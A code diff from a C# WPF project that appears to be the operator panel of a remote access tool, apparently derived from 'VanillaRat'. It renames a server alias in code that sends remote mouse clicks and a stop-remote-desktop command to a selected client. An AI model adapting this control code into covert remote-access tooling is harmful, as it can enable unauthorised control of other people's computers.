@@ -11,7 +11,7 @@ using System.Windows.Media;
 using System.Windows.Media.Imaging;
 using System.Windows.Threading;
 using TaskManager.Command;
-using VanillaRat.Classes;
+using Serverr = Server.Server;
 using WpfApp15.ViewModel;
 
 
@@ -26,21 +26,21 @@ namespace WpfApp15.Scripts.Model.Program
             MouseDoubleClickImage = new RelayCommand2(()=> {
                 if (Cursor==Cursors.Hand)
                 {
-                    Server.MainServer.Send(TaskManager.ViewModel.selectedData.Id, Encoding.ASCII.GetBytes(@"[<MOUSE>]DOUBLE[<\MOUSE>][<X>]" + MouseX + @"[<\X>][<Y>]" + MouseY + @"[<\Y>]"));
+                    Serverr.MainServer.Send(TaskManager.ViewModel.selectedData.Id, Encoding.ASCII.GetBytes(@"[<MOUSE>]DOUBLE[<\MOUSE>][<X>]" + MouseX + @"[<\X>][<Y>]" + MouseY + @"[<\Y>]"));
                 }
             });
             MouseClickLeftImage = new RelayCommand2(()=>
             {
                 if (Cursor == Cursors.Hand)
                 {
-                    Server.MainServer.Send(TaskManager.ViewModel.selectedData.Id, Encoding.ASCII.GetBytes(@"[<MOUSE>]SINGLE-LEFT[<\MOUSE>][<X>]" + MouseX + @"[<\X>][<Y>]" + MouseY + @"[<\Y>]"));
+                    Serverr.MainServer.Send(TaskManager.ViewModel.selectedData.Id, Encoding.ASCII.GetBytes(@"[<MOUSE>]SINGLE-LEFT[<\MOUSE>][<X>]" + MouseX + @"[<\X>][<Y>]" + MouseY + @"[<\Y>]"));
                 }
             });
             MouseClickRightImage = new RelayCommand2(() =>
             {
                 if (Cursor == Cursors.Hand)
                 {
-                    Server.MainServer.Send(TaskManager.ViewModel.selectedData.Id, Encoding.ASCII.GetBytes(@"[<MOUSE>]SINGLE-RIGHT[<\MOUSE>][<X>]" + MouseX + @"[<\X>][<Y>]" + MouseY + @"[<\Y>]"));
+                    Serverr.MainServer.Send(TaskManager.ViewModel.selectedData.Id, Encoding.ASCII.GetBytes(@"[<MOUSE>]SINGLE-RIGHT[<\MOUSE>][<X>]" + MouseX + @"[<\X>][<Y>]" + MouseY + @"[<\Y>]"));
                 }
             });
             DownButton = new RelayCommand2(()=> 
@@ -87,7 +87,7 @@ namespace WpfApp15.Scripts.Model.Program
         }
         private void StopRD()
         {
-            Server.MainServer.Send(TaskManager.ViewModel.selectedData.Id, Encoding.ASCII.GetBytes("StopRD"));
+            Serverr.MainServer.Send(TaskManager.ViewModel.selectedData.Id, Encoding.ASCII.GetBytes("StopRD"));
             TaskManager.ViewModel.RDActive = false;
         }
         void GetScreenAsync()
